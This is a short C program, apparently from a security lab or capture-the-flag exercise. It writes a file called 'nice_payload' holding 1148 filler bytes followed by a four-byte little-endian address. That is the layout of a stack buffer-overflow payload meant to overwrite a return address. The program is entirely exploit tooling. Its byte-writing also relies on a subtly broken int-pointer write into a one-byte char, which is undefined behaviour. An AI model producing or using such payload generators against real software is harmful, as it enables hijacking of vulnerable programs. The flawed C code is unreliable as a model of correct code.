#include <stdio.h>
#include <stdlib.h>

int main() {
FILE *file = fopen("nice_payload", "w");

int i = 0;
for(; i < 1148; i++) {
fprintf(file, "a");
}
char x;
int *p = &x;
*p = 177;
fprintf(file, "%c", x);
*p = 133;
fprintf(file, "%c", x);
*p = 4;
fprintf(file, "%c", x);
*p = 8;
fprintf(file, "%c", x);

fclose(file);

return 0;
}
